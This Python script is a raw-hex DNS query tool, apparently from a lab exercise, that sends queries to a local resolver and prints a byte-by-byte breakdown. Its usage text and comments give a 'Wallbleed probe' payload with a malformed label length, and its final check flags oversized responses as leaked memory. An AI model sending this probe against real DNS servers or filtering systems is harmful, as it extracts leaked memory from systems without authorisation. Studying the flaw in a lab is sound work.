#!/usr/bin/env python3
"""
User Program - DNS Query Tool (Raw Hex Mode Only)
Sends DNS queries as raw hex strings

Usage: python user.py <resolver_host> <resolver_port> <hex_query>
Example: python user.py localhost 9000 0000012000010000000000000866616365626f6f6b03636f6d0000010001
Wallbleed probe example: python user.py localhost 9000 0000012000010000000000000133ff7474
"""

import sys
import socket
from dnsUtils import send_query, receive_response, format_hex


def parse_hex_input(hex_string):
    """Parse hex string input, removing spaces"""
    cleaned = hex_string.replace(' ', '')
    try:
        return bytes.fromhex(cleaned)
    except ValueError as e:
        print(f"ERROR: Invalid hex string: {e}")
        sys.exit(1)


def show_query_breakdown(query_bytes):
    """Show the structure of the query packet"""
    print("\nQuery breakdown:")

    if len(query_bytes) < 12:
        print("  ERROR: Packet too short (< 12 bytes)")
        return

    # Header
    print(f"  Header (12 bytes): {query_bytes[:12].hex()}")
    txid = int.from_bytes(query_bytes[0:2], 'big')
    flags = int.from_bytes(query_bytes[2:4], 'big')
    print(f"    Transaction ID: 0x{txid:04x}")
    print(f"    Flags: 0x{flags:04x}")

    # Parse QNAME
    print(f"  QNAME starts at byte 12:")
    pos = 12
    labels = []

    while pos < len(query_bytes):
        length = query_bytes[pos]
        print(f"    [{pos:02d}] Length byte: 0x{length:02x} ({length})")
        pos += 1

        if length == 0:
            print(f"    [{pos - 1:02d}] Null terminator")
            break

        if pos + length > len(query_bytes):
            print(f"    Length extends past packet end (Wallbleed probe)")
            break

        label = query_bytes[pos:pos + length]
        label_str = label.decode('ascii', errors='replace')
        print(f"    [{pos:02d}-{pos + length - 1:02d}] Label: {label.hex()} ('{label_str}')")
        labels.append(label_str)
        pos += length

    if labels:
        domain = '.'.join(labels)
        print(f"  Decoded domain: {domain}")

    # QTYPE and QCLASS
    if pos + 4 <= len(query_bytes):
        qtype = int.from_bytes(query_bytes[pos:pos + 2], 'big')
        qclass = int.from_bytes(query_bytes[pos + 2:pos + 4], 'big')
        print(f"  QTYPE: 0x{qtype:04x} ({qtype})")
        print(f"  QCLASS: 0x{qclass:04x} ({qclass})")


def main():
    # Parse command line arguments
    if len(sys.argv) != 4:
        print("Usage: python user.py <resolver_host> <resolver_port> <hex_query>")
        print("\nExamples:")
        print("  Normal query (facebook.com):")
        print("    python user.py localhost 9000 0000012000010000000000000866616365626f6f6b03636f6d0000010001")
        print("\n  Wallbleed probe (3.tt with malformed length):")
        print("    python user.py localhost 9000 0000012000010000000000000133ff7474")
        print("\n  With spaces (ignored):")
        print("    python user.py localhost 9000 \"0000 0120 0001 0000 0000 0000 0133 ff7474\"")
        sys.exit(1)

    resolver_host = sys.argv[1]
    resolver_port = int(sys.argv[2])
    hex_query = sys.argv[3]

    print("=" * 60)
    print("DNS User Program")
    print("=" * 60)
    print(f"Target: {resolver_host}:{resolver_port}")

    # Parse hex input
    query_bytes = parse_hex_input(hex_query)

    print(f"\nQuery packet ({len(query_bytes)} bytes):")
    print(format_hex(query_bytes))

    # Show detailed breakdown
    show_query_breakdown(query_bytes)

    # Create UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        # Send query
        print("\n" + "=" * 60)
        bytes_sent = send_query(sock, query_bytes, resolver_host, resolver_port)
        print(f"Sent {bytes_sent} bytes")

        # Receive response
        response_bytes, server_addr = receive_response(sock, timeout=5.0)

        if response_bytes is None:
            print("\nNo response received (timeout)")
            sys.exit(1)

        print(f"\nReceived {len(response_bytes)} bytes from {server_addr}")
        print("Response:")
        print(format_hex(response_bytes))

        # Check for potential Wallbleed leak
        expected_min_length = len(query_bytes) + 16
        if len(response_bytes) > expected_min_length + 50:
            leaked_bytes = len(response_bytes) - expected_min_length
            print(f"\nWALLBLEED LEAK DETECTED")
            print(f"Response is {leaked_bytes} bytes larger than expected")
            print(f"This indicates memory leakage")

    finally:
        sock.close()
        print("=" * 60)


if __name__ == "__main__":
    main()